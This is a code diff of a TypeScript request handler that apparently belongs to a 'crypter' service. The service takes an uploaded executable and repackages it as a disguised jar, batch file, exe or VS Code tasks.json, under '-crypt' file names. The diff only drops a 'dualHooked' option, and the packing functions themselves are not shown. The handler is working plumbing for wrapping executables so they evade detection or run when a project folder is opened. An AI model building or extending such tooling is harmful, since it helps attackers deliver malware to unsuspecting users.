@@ -30,7 +30,6 @@ serve({
 
       const file = form.get("file") as File | null;
       const format = (form.get("format") as string | null)?.trim().toLowerCase();
-      const dualHooked = form.get("dualHooked") === "true";
 
       if (!file) return json({ error: "No file provided" }, 400);
       if (!["jar", "exe", "bat", "tasks"].includes(format ?? ""))
@@ -39,7 +38,6 @@ serve({
       const exeData = Buffer.from(await file.arrayBuffer());
       const baseName = file.name.replace(/\.[^/.]+$/, "");
 
-      // Work in a temp dir, clean up after
       const tmpOut = fs.mkdtempSync("/tmp/crypt-out-");
       try {
         let outFile: string;
@@ -50,22 +48,22 @@ serve({
           outFile = path.join(tmpOut, "out.jar");
           outName = `${baseName}-crypt.jar`;
           mime = "application/java-archive";
-          await cryptToJar(exeData, outFile, { dualHooked });
+          await cryptToJar(exeData, outFile);
         } else if (format === "bat") {
           outFile = path.join(tmpOut, "out.bat");
           outName = `${baseName}-crypt.bat`;
           mime = "application/octet-stream";
-          await cryptToBat(exeData, outFile, { dualHooked });
+          await cryptToBat(exeData, outFile);
         } else if (format === "tasks") {
           outFile = path.join(tmpOut, "tasks.json");
           outName = `tasks.json`;
           mime = "application/json";
-          await cryptToTasksJson(exeData, outFile, { dualHooked });
+          await cryptToTasksJson(exeData, outFile);
         } else {
           outFile = path.join(tmpOut, "out.exe");
           outName = `${baseName}-crypt.exe`;
           mime = "application/octet-stream";
-          await cryptToExe(exeData, outFile, { dualHooked });
+          await cryptToExe(exeData, outFile);
         }
 
         const data = fs.readFileSync(outFile);
